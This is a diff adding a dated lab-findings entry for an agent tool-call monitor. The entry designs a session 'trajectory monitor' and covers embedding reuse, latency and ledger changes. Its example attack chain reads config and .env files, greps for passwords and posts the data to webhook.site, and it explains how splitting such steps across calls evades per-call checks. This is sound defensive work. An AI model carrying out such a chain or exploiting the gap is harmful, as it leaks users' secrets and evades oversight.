@@ -1,3 +1,98 @@
+# Kavach Lab Findings — June 2, 2026
+
+## Trajectory Monitor — feasibility + design lock-in
+
+### The gap (confirmed in source, not hand-waved)
+
+Kavach today scores each tool call in isolation. A multi-step attack split
+across individually-benign calls slips through until the final obvious step:
+
+```
+1. tool:read_file src/config.py        → ALLOW    (benign)
+2. tool:exec grep -r "password" .       → ALLOW    (borderline)
+3. tool:read_file .env                  → ALLOW    (borderline)
+4. tool:http_post webhook.site data=... → BLOCK    (caught only here)
+```
+
+Steps 1–3 build the attack; only step 4 is caught. We want the *sequence*
+flagged as a pattern, not just the last call.
+
+Confirmed in code:
+- `server.py` `_state` held only `intents` (session_id → vector). **No
+  per-session window of prior actions existed in memory.**
+- `_compass_drift()` was strictly pairwise — seeded intent vs current action.
+  It never accumulated and never looked at prior actions.
+- `speaker.py` is stateless per call. The April "3+ blocks → escalate"
+  design was never implemented.
+- The hash-chained ledger exists only in the browser lab. The production
+  ledger (`votes` table) is plain SQLite, **no `prev_hash`/SHA-256 chain.**
+  (Either implement, or stop claiming it in the paper.)
+
+### Feasibility verdict: YES. Latency is a non-issue if built correctly.
+
+The latency fear was: trajectory analysis = re-embed the window per call =
++~800ms = brush the 3000ms hook timeout / trip the fail-closed breaker.
+
+It does NOT need to re-embed. Findings:
+- Each minister already called `embed_fn(text)` internally and discarded the
+  vector. The dual-corpus path embedded the same text **twice**. Across
+  COMPASS + 4 ministers × dual corpus, the same `req.text` was embedded up to
+  **9 times per call.**
+- Fix: embed `req.text` ONCE in the parliament endpoint, pass the precomputed
+  vector into COMPASS and the ministers (skip their internal embed), AND into
+  the trajectory deque.
+- Net effect: trajectory adds **zero** embeds and **reduces** current
+  redundant embedding. Per-call cost of trajectory scoring = cosine math over
+  ~12 cached 768-dim vectors ≈ sub-1ms.
+
+| | embeds/call (before) | embeds/call (after) |
+|---|---|---|
+| COMPASS drift | 1 | 0 (shared) |
+| 4 ministers, dual corpus | up to 8 (text re-embedded each query) | 0 (shared) |
+| shared endpoint embed | 0 | 1 |
+| trajectory add-on | n/a | 0 (reuses the shared vector) |
+| **total** | **up to 9** | **1** |
+
+Latency budget is **unchanged-to-better**. Timeout never threatened.
+
+### Novelty caveat (must be handled honestly)
+
+PRISM (arXiv:2603.11853) already does session-scoped risk accumulation with
+TTL decay. A scalar accumulating counter is **not novel** — it's PRISM.
+The defensible contribution is **semantic trajectory** detection in embedding
+space: scoring the windowed sequence of action vectors (coherence of flagged
+actions + monotonic drift away from intent + cosine to attack-chain
+prototypes), not a numeric counter.
+
+### Dependency
+
+FINDINGS #9 (live `compass_sim: null` because `seed_intent` isn't called
+before the agent runs) gates the **drift-escalation leg** only. The
+**accumulation leg** and the **chain leg** work off the call sequence with no
+intent seeding. → Minimal monitor ships now; full monitor waits on #9.
+
+### Design lock-in
+
+- New `_state["history"]: dict[session_id → deque(maxlen=N)]`, records
+  `(ts, action_vec, verdict, confidence, decided_by)`.
+- New `parliament/trajectory.py` — three legs (accumulation / escalation /
+  chain), combined into a 0..1 `risk`. Pure numpy, no model calls.
+- Feeds the planned dynamic-threshold formula (item #1 below):
+  `effective_threshold = base + (compass_sim − 0.5)·drift_factor − risk·k`
+- Branch: `ishani/trajectory-monitor`.
+
+### Files Changed Today
+
+| File | Change |
+|---|---|
+| `parliament/trajectory.py` | NEW — session trajectory monitor (3 legs, no re-embed) |
+| `parliament/ministers.py` | `run_minister`/`run_minister_dual` accept optional `query_vec` (skip embed) |
+| `parliament/server.py` | embed-once (1 embed/call, was up to 9); `_state["history"]` deque; trajectory risk → modulated block threshold; `traj_risk` logged to ledger + returned in response; COMPASS reuses shared vector |
+| `parliament/server.py` (ledger) | `votes` table gains `traj_risk` column with safe ALTER migration for old DBs |
+| `MASTER_PLAN.md` | added Trajectory monitor (semantic, embedding-window) line |
+
+---
+
 # Kavach Lab Findings — June 1, 2026
 
 Dell Precision 3660 · i9-13900 · 128GB RAM · RTX 4090
